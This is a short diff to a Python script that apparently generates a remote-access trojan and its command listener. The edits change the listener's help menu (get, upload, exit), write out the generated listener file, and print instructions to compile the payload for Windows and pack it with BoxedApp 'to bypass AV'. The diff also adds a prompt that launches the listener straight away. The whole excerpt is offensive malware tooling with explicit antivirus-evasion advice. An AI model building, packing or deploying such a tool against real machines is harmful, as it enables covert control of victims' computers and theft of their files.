@@ -245,9 +245,10 @@ while msg_a_envoyer != b"exit":
 			file.write(data)
 			file.close()
 		if msg_a_envoyer == b"help":
-			print("List of commands :")
+			print("List of extra commands :")
 			print("get [FILE]")
 			print("upload [FILE]")
+			print("exit")
 
 		if msg_a_envoyer[:3] != b'get' and msg_a_envoyer != b'exit' and msg_a_envoyer[:6] != b'upload' and msg_a_envoyer[:6] != b'stream' and msg_a_envoyer != b'help':
 			connexion_avec_client.send(msg_a_envoyer)
@@ -269,7 +270,15 @@ file.write(listener)
 file.close()
 print("{R}[{G}+{R}]{R} Listener{G} file {R}generated".format(R=RED, G=GREEN, N=NORMAL))
 time.sleep(1)
-print("Now you have to : \n{Y}Compile on a {R}Windows {Y}with {R}auto-py-to-exe\nBuild{Y} with {R}BoxedApp{Y} packer to bypass AV".format(R=RED, Y=YELLOW))
+print("Now you have to : \n{Y}Compile payload on a {R}Windows {Y}with {R}auto-py-to-exe\nBuild{Y} with {R}BoxedApp{Y} packer to bypass AV".format(R=RED, Y=YELLOW))
+launch=input("Launch {R}listener {Y}now ? {R}y/n  ".format(R=RED, Y=YELLOW))
+if launch == "y":
+	cmd = "python3 " + servername
+	print(cmd,"{B}".format(B=BASIC))
+	os.system("clear")
+	os.system(cmd)
+else:
+	print("Adios")
 ''' TO ADD IN NEXT UPDATE
 compil=input("Would you like to compile payload into exe ? y/n ")
 if compil=="y":
